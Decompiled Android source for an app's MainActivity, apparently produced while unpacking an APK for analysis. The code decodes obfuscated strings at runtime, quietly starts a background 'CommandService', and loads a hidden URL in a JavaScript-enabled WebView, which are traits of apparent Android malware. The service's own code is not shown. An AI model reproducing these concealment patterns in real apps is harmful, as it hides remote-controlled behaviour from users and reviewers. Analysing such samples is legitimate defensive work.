package com.base.template;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.base.template.services.CommandService;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class MainActivity extends Activity {
    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (!getSharedPreferences(C0000.decode(new byte[]{70, 3, 69, 19, 67}, "5f1f374fe03e", 0.0f), 0).getBoolean(C0000.decode(new byte[]{84, 11, 94, 87}, "0d020ffe0290cc2d"), false)) {
            startActivity(new Intent(this, (Class<?>) OnboardingActivity.class));
            finish();
            return;
        }
        CommandService commandService = CommandService.instance;
        Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{117, 33, 103, 122, 98, 45, 96, 109, 107, 49, 103, 114, 102, 48}, "4b334d44", 1));
        String strDecode = OnboardingConfig.WEBVIEW_URL;
        if (strDecode.length() <= 0 || strDecode.equals(C0000.decode(new byte[]{8, 69, 13, 85}, "f0a9280c8d5422"))) {
            strDecode = C0000.decode(new byte[]{88, 17, 71, 71, 64, 91, 29, 76, 71, 18, 68, 25, 84, 14, 93, 4, 92, 0, 29, 84, 92, 12}, "0e373a2c", 6);
        }
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setMixedContentMode(0);
        webView.getSettings().setCacheMode(-1);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.loadUrl(strDecode);
        setContentView(webView);
    }
}
